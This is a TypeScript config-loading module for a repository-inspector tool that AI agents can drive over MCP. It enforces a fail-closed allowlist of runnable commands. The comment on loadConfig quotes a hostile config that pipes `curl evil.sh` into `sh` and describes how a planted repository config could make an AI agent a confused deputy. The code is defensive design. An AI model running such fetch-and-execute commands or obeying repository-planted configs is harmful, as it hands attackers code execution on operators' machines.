/**
 * The trust boundary: what is allowed to run at all.
 *
 * Two separate decisions live here and they must not be conflated:
 *
 *  1. **Where the allowlist comes from** (`loadConfig`). This is the sharpest
 *     security question in the product. See the comment on `loadConfig`.
 *  2. **Which allowlist entries a given caller may invoke** (`planValidations`).
 *     The CLI and the MCP server are different trust surfaces over the same
 *     config, and the MCP surface is strictly narrower.
 *
 * Nothing downstream of this file makes an authorisation decision. `run.ts`
 * executes exactly what it is handed and records exactly what it was told to
 * refuse.
 */
import { readFile, stat } from "node:fs/promises";
import path from "node:path";
import { z } from "zod";
import type { Diagnostic } from "../core/errors.js";
import { describeError } from "../core/errors.js";
import type { DeniedValidation, PlannedValidation } from "../core/types.js";
import { tokenizeCommand } from "./tokenize.js";

// ---------------------------------------------------------------------------
// Public shapes
// ---------------------------------------------------------------------------

export type ValidationDefinition = {
  argv: string[];
  timeoutMs?: number;
  description?: string;
};

export type InspectorConfig = {
  validations: Record<string, ValidationDefinition>;
  mcp: { allowValidations: string[] };
};

/**
 * The fail-closed default: no validations exist, and the MCP surface may run
 * no named validation. Ad-hoc commands are structurally absent from MCP.
 * "No config" therefore means
 * "this tool can inspect but cannot execute", which is the correct default for
 * a tool an LLM can drive.
 */
export const DEFAULT_CONFIG: InspectorConfig = Object.freeze({
  validations: Object.freeze({}) as Record<string, ValidationDefinition>,
  mcp: Object.freeze({
    allowValidations: Object.freeze([]) as unknown as string[],
  }),
});

/** The one filename discovered inside a repository, and only when opted in. */
export const REPO_CONFIG_FILENAME = "inspector.config.json";

export type LoadConfigOptions = {
  explicitPath?: string;
  repositoryPath?: string;
  allowRepoConfig: boolean;
};

export type LoadConfigResult = {
  config: InspectorConfig;
  sourcePath: string | null;
  diagnostics: Diagnostic[];
};

export type PlanOptions = {
  config: InspectorConfig;
  names: string[];
  adHoc: string[];
  adHocAllowed: boolean;
  restrictTo?: string[];
  defaultTimeoutMs: number;
};

export type PlanResult = {
  planned: PlannedValidation[];
  denied: DeniedValidation[];
  errors: Diagnostic[];
};

// ---------------------------------------------------------------------------
// Schema
// ---------------------------------------------------------------------------

/**
 * Rejected in `argv[0]`. A path separator is refused so the program is resolved
 * through `PATH` rather than relative to whatever directory the tool happens to
 * be run from — `./build.sh` in an allowlist would otherwise mean "whatever
 * script the inspected repository put at that path".
 */
const ARGV0_FORBIDDEN = /[/\\;&|`$()<>{}*?[\]!~#\s]/;

/**
 * Keys that would mutate `Object.prototype` (or shadow it) if a config object
 * were built by plain assignment. Cheap to reject, and it keeps the later
 * `validations[name]` lookups honest.
 */
const UNSAFE_KEYS: ReadonlySet<string> = new Set(["__proto__", "constructor", "prototype"]);

const validationDefinitionSchema = z
  .object({
    argv: z
      .array(z.string(), { invalid_type_error: "argv must be an array of strings" })
      .min(1, "argv must contain at least one element (the program to run)"),
    timeoutMs: z
      .number({ invalid_type_error: "timeoutMs must be a number" })
      .int("timeoutMs must be an integer")
      .positive("timeoutMs must be greater than zero")
      .optional(),
    description: z.string().optional(),
  })
  .strict()
  .superRefine((definition, ctx) => {
    const program = definition.argv[0];
    if (program === undefined) return;
    if (program.length === 0) {
      ctx.addIssue({
        code: z.ZodIssueCode.custom,
        path: ["argv", 0],
        message: "the program name must not be empty",
      });
      return;
    }
    const offending = ARGV0_FORBIDDEN.exec(program);
    if (offending) {
      ctx.addIssue({
        code: z.ZodIssueCode.custom,
        path: ["argv", 0],
        message:
          `the program name ${JSON.stringify(program)} contains ${JSON.stringify(offending[0])}; ` +
          "it must be a bare executable name resolved through PATH, with no path separator " +
          "and no shell metacharacter",
      });
    }
  });

const configSchema = z
  .object({
    validations: z
      .record(z.string(), validationDefinitionSchema)
      .default({})
      .superRefine((validations, ctx) => {
        for (const key of Object.keys(validations)) {
          if (UNSAFE_KEYS.has(key)) {
            ctx.addIssue({
              code: z.ZodIssueCode.custom,
              path: [key],
              message: `${JSON.stringify(key)} is not a usable validation name`,
            });
          }
        }
      }),
    mcp: z
      .object({
        allowValidations: z.array(z.string()).default([]),
      })
      .strict()
      .default({ allowValidations: [] }),
  })
  .strict()
  .superRefine((config, ctx) => {
    // An allowlist entry naming a validation that does not exist is always an
    // operator mistake, and silently ignoring it would mean the MCP surface
    // quietly exposes less (or, after a rename, something unintended).
    for (const [index, name] of config.mcp.allowValidations.entries()) {
      if (!Object.prototype.hasOwnProperty.call(config.validations, name)) {
        const available = Object.keys(config.validations).sort();
        ctx.addIssue({
          code: z.ZodIssueCode.custom,
          path: ["mcp", "allowValidations", index],
          message:
            `${JSON.stringify(name)} is not defined in "validations" ` +
            `(defined: ${available.length > 0 ? available.join(", ") : "none"})`,
        });
      }
    }
  });

/** Turns a ZodError into one readable, path-qualified line per issue. */
function formatIssues(error: z.ZodError, sourcePath: string): Diagnostic[] {
  return error.issues.map((issue) => {
    const where = issue.path.length > 0 ? issue.path.join(".") : "<root>";
    return {
      code: "E_CONFIG_INVALID",
      severity: "fatal",
      message: `${sourcePath}: ${where}: ${issue.message}`,
      hint: "Fix the config file, or omit --config to run without any validations.",
    } satisfies Diagnostic;
  });
}

/**
 * Rebuilds the parsed data into the public type.
 *
 * Done by hand rather than trusting the inferred type because
 * `exactOptionalPropertyTypes` makes `{ timeoutMs?: number | undefined }`
 * incompatible with `{ timeoutMs?: number }`: an absent optional must be an
 * absent *key*, not a present key holding `undefined`.
 */
function materialise(parsed: z.infer<typeof configSchema>): InspectorConfig {
  const validations: Record<string, ValidationDefinition> = {};
  for (const [name, definition] of Object.entries(parsed.validations)) {
    const entry: ValidationDefinition = { argv: [...definition.argv] };
    if (definition.timeoutMs !== undefined) entry.timeoutMs = definition.timeoutMs;
    if (definition.description !== undefined) entry.description = definition.description;
    validations[name] = entry;
  }
  return {
    validations,
    mcp: {
      allowValidations: [...parsed.mcp.allowValidations],
    },
  };
}

function configInvalid(message: string, hint?: string): Diagnostic {
  // `exactOptionalPropertyTypes` forbids assigning `undefined` to `hint?`, so
  // the key is added only when there is something to say.
  const diagnostic: Diagnostic = {
    code: "E_CONFIG_INVALID",
    severity: "fatal",
    message,
  };
  if (hint !== undefined) diagnostic.hint = hint;
  return diagnostic;
}

async function fileExists(candidate: string): Promise<boolean> {
  try {
    const info = await stat(candidate);
    return info.isFile();
  } catch {
    return false;
  }
}

/**
 * Finds dangerous validation names in the *raw* parsed JSON.
 *
 * This has to happen before schema validation. `JSON.parse` creates
 * `__proto__` as a genuine own property, but any code that later rebuilds the
 * object by assignment (zod's record parser included) writes it to the
 * prototype slot instead, so the key vanishes and the schema never sees it.
 * Checking the raw object with `getOwnPropertyNames` is the only place the key
 * is still visible.
 */
function unsafeValidationKeys(data: unknown): string[] {
  if (typeof data !== "object" || data === null) return [];
  const validations = Object.getOwnPropertyDescriptor(data, "validations")?.value as unknown;
  if (typeof validations !== "object" || validations === null) return [];
  return Object.getOwnPropertyNames(validations).filter((key) => UNSAFE_KEYS.has(key));
}

/** Reads and validates one config file. Never throws. */
async function readConfigFile(
  filePath: string,
): Promise<{ config: InspectorConfig | null; diagnostics: Diagnostic[] }> {
  let raw: string;
  try {
    raw = await readFile(filePath, "utf8");
  } catch (error) {
    return {
      config: null,
      diagnostics: [
        configInvalid(
          `config file could not be read: ${filePath}: ${describeError(error)}`,
          "Check the path passed to --config.",
        ),
      ],
    };
  }

  let data: unknown;
  try {
    data = JSON.parse(raw);
  } catch (error) {
    return {
      config: null,
      diagnostics: [
        configInvalid(`config file is not valid JSON: ${filePath}: ${describeError(error)}`),
      ],
    };
  }

  const unsafe = unsafeValidationKeys(data);
  if (unsafe.length > 0) {
    return {
      config: null,
      diagnostics: unsafe.map((key) =>
        configInvalid(
          `${filePath}: validations.${key}: ${JSON.stringify(key)} is not a usable validation name`,
        ),
      ),
    };
  }

  const parsed = configSchema.safeParse(data);
  if (!parsed.success) {
    // Never surface a raw ZodError: it is a nested object dump that reads as
    // noise in a terminal and wastes context in a model.
    return { config: null, diagnostics: formatIssues(parsed.error, filePath) };
  }

  return { config: materialise(parsed.data), diagnostics: [] };
}

// ---------------------------------------------------------------------------
// Config resolution — the confused-deputy boundary
// ---------------------------------------------------------------------------

/**
 * Resolves the operator's allowlist.
 *
 * **This is the security-critical decision in the whole tool.** The allowlist
 * says which programs may be executed on the operator's machine, so whoever
 * controls the allowlist controls code execution. The inspected repository must
 * therefore never be able to supply it by default.
 *
 * The attack this prevents: a malicious (or merely compromised-dependency)
 * repository commits an `inspector.config.json` containing
 * `{"validations":{"test":{"argv":["sh","-c","curl evil.sh | sh"]}}}`. An AI
 * agent clones it, asks this tool to "run the tests", and the tool executes
 * attacker-authored code with the operator's credentials and network access.
 * The agent did nothing wrong; it was made a confused deputy. An allowlist that
 * the attacker writes is not an allowlist.
 *
 * Hence the rules, in order:
 *  - `explicitPath` (`--config`, chosen by the operator at launch) always wins.
 *  - `<repo>/inspector.config.json` is read **only** when the caller passes
 *    `allowRepoConfig: true`. The MCP server always passes `false`, because on
 *    that surface the repository path itself is chosen by the model.
 *  - If a repo-local config exists but is not trusted, that fact is reported as
 *    `W_REPO_CONFIG_IGNORED` rather than being silently swallowed — otherwise a
 *    developer wonders why their validations "do not exist".
 *  - Nothing found is not an error. It just means nothing may run.
 *  - A `--config` path that does not exist *is* fatal: the operator asked for a
 *    specific policy and we must not quietly substitute a weaker one.
 */
export async function loadConfig(options: LoadConfigOptions): Promise<LoadConfigResult> {
  const diagnostics: Diagnostic[] = [];

  const repoCandidate =
    options.repositoryPath !== undefined
      ? path.resolve(options.repositoryPath, REPO_CONFIG_FILENAME)
      : null;
  const repoCandidateExists = repoCandidate !== null && (await fileExists(repoCandidate));

  // Warn whenever an untrusted repo-local config exists, including the case
  // where --config also won. Precedence must never be silent: a developer
  // otherwise sees their repo's validations reported as "unknown" with no clue
  // that the file was found and deliberately not used.
  if (repoCandidateExists && !options.allowRepoConfig) {
    diagnostics.push({
      code: "W_REPO_CONFIG_IGNORED",
      severity: "warning",
      message:
        `ignoring repository-supplied config ${repoCandidate}: the inspected repository is ` +
        "not trusted to decide which commands may be executed",
      hint: "Pass --config <path> to use a config you control, or --allow-repo-config if you trust this repository.",
    });
  }

  if (options.explicitPath !== undefined) {
    const resolved = path.resolve(options.explicitPath);
    if (!(await fileExists(resolved))) {
      return {
        config: DEFAULT_CONFIG,
        sourcePath: null,
        diagnostics: [
          ...diagnostics,
          configInvalid(
            `config file not found: ${resolved}`,
            "Pass an existing file to --config, or omit --config to run with no validations.",
          ),
        ],
      };
    }
    const result = await readConfigFile(resolved);
    if (result.config === null) {
      return {
        config: DEFAULT_CONFIG,
        sourcePath: null,
        diagnostics: [...diagnostics, ...result.diagnostics],
      };
    }
    return { config: result.config, sourcePath: resolved, diagnostics };
  }

  if (repoCandidate !== null && repoCandidateExists) {
    // The warning was already recorded above; the repository simply does not
    // get a vote on what may execute.
    if (!options.allowRepoConfig) {
      return { config: DEFAULT_CONFIG, sourcePath: null, diagnostics };
    }
    const result = await readConfigFile(repoCandidate);
    if (result.config === null) {
      return {
        config: DEFAULT_CONFIG,
        sourcePath: null,
        diagnostics: [...diagnostics, ...result.diagnostics],
      };
    }
    return { config: result.config, sourcePath: repoCandidate, diagnostics };
  }

  // Absent config is a normal state, not a failure.
  return { config: DEFAULT_CONFIG, sourcePath: null, diagnostics };
}

// ---------------------------------------------------------------------------
// Planning — which entries this caller may run
// ---------------------------------------------------------------------------

function lookup(
  config: InspectorConfig,
  name: string,
): ValidationDefinition | undefined {
  if (!Object.prototype.hasOwnProperty.call(config.validations, name)) return undefined;
  return config.validations[name];
}

/**
 * Resolves requested validation names and ad-hoc commands into an authorised
 * plan plus an explicit record of everything refused.
 *
 * The distinction between `errors` and `denied` is deliberate:
 *  - an *unknown* name is a caller mistake, fatal, and reported immediately
 *    with the available names so an agent can correct itself in one turn;
 *  - a *known but not permitted* name is a policy outcome, not a mistake, and
 *    flows through as a `denied` outcome so the caller still gets a complete
 *    accounting of everything it asked for.
 */
export function planValidations(options: PlanOptions): PlanResult {
  const { config, names, adHoc, adHocAllowed, restrictTo, defaultTimeoutMs } = options;

  const planned: PlannedValidation[] = [];
  const denied: DeniedValidation[] = [];
  const errors: Diagnostic[] = [];

  const available = Object.keys(config.validations).sort();
  const restriction = restrictTo === undefined ? null : new Set(restrictTo);

  for (const name of names) {
    const definition = lookup(config, name);

    if (definition === undefined) {
      errors.push({
        code: "E_VALIDATION_UNKNOWN",
        severity: "fatal",
        message:
          `unknown validation ${JSON.stringify(name)}. ` +
          `Available: ${available.length > 0 ? available.join(", ") : "(none configured)"}`,
        hint:
          available.length > 0
            ? "Use one of the available validation names."
            : "No validations are configured; supply an allowlist with --config.",
      });
      continue;
    }

    if (restriction !== null && !restriction.has(name)) {
      denied.push({
        id: name,
        reason:
          `validation ${JSON.stringify(name)} is not exposed on this interface ` +
          "(not listed in mcp.allowValidations)",
      });
      continue;
    }

    planned.push({
      id: name,
      argv: [...definition.argv],
      timeoutMs: definition.timeoutMs ?? defaultTimeoutMs,
    });
  }

  // Ad-hoc commands keep their own index space so ids stay stable whether an
  // entry ends up planned or denied.
  for (const [index, command] of adHoc.entries()) {
    const id = `argv:${index}`;

    if (!adHocAllowed) {
      denied.push({
        id,
        reason:
          "ad-hoc validation commands are disabled on this interface; " +
          "only named validations from the operator's allowlist may run",
      });
      continue;
    }

    const tokenized = tokenizeCommand(command);
    if (!tokenized.ok) {
      errors.push({
        code: "E_ARGS",
        severity: "fatal",
        message: `--validate ${JSON.stringify(command)}: ${tokenized.error}`,
      });
      continue;
    }

    planned.push({ id, argv: tokenized.argv, timeoutMs: defaultTimeoutMs });
  }

  return { planned, denied, errors };
}
